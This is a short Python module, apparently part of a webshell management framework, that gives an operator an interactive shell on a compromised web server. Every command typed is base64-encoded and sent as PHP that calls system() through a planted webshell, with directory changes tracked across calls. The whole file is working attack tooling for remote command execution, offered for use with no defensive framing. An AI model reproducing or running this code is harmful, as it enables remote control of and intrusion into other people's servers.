from libs.config import gget, alias, color, set_namespace
from libs.myapp import send, base64_encode


@alias(func_alias="s")
def run():
    """
    shell

    Get a fake shell of target system.
    """
    print(color.cyan("Eenter interactive temporary shell...\n"))
    cwd = send(f'print(getcwd());').r_text.strip()
    while gget("loop"):
        data = input(f"[{cwd}] $ ")
        lower_data = data.lower()
        if (lower_data.lower() in ['exit', 'quit', 'back']):
            break
        data = base64_encode(data)
        if (lower_data.startswith("cd ") and len(lower_data) > 3):
            path = lower_data[3:].strip()
            cwd = send(f'chdir(\'{cwd}\');chdir(\'{path}\');print(getcwd());').r_text.strip()
        else:
            res = send(f'chdir(\'{cwd}\');system(base64_decode(\'{data}\'));')
            print("\n" + res.r_text.strip() + "\n")
    set_namespace("webshell")
